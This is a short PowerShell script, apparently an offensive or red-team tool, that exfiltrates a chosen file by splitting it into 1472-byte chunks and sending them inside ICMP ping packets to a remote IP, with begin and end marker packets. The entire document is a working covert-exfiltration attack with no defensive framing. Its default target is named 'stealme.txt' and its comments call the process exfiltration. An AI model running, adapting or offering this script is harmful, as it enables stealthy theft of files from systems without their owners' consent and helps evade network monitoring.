param(
    [string]$TargetFile = "$HOME\Desktop\stealme.txt",
    [string]$IP = "CHANGEME"
)

$ICMPClient = New-Object System.Net.NetworkInformation.Ping
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
$PingOptions.DontFragment = $true

# Data must be broken into chunk sizes of 1472
[int]$bufSize = 1472

$stream = [System.IO.File]::OpenRead($TargetFile)
$chunkNum = 0
$TotalChunks = [math]::floor($stream.Length / 1472)
$barr = New-Object byte[] $bufSize

# Begin exfiltration of data
$sendbytes = ([text.encoding]::ASCII).GetBytes("BOFAwesomefile.txt")
$ICMPClient.Send($IP, 10, $sendbytes, $PingOptions) | Out-Null

while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
    $ICMPClient.Send($IP, 10, $barr, $PingOptions) | Out-Null
    $ICMPClient.PingCompleted
    sleep 1
    Write-Output "Done with $chunkNum out of $TotalChunks"
    $chunkNum += 1
}

# Finish exfiltration of data
$sendbytes = ([text.encoding]::ASCII).GetBytes("EOF")
$ICMPClient.Send($IP, 10, $sendbytes, $PingOptions) | Out-Null
Write-Output "File Transfered"
